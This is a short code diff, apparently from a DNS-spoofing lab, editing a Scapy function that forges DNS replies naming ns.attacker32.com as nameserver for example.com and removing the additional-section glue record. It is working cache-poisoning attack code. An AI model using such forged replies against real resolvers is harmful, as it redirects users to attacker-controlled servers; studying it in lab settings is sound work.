@@ -18,14 +18,10 @@ def spoof_dns(pkt):
     NSsec1 = DNSRR(rrname='example.com', type='NS',
                    ttl=259200, rdata='ns.attacker32.com')
 
-    # The Additional Section
-    Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',
-                    ttl=259200, rdata='10.9.0.153')
-
     # Construct the DNS packet
     DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
-                 qdcount=1, ancount=1, nscount=1, arcount=1,
-                 an=Anssec, ns=NSsec1, ar=Addsec1)
+                 qdcount=1, ancount=1, nscount=1, arcount=0,
+                 an=Anssec, ns=NSsec1)
 
     # Construct the entire IP packet and send it out
     spoofpkt = IPpkt/UDPpkt/DNSpkt
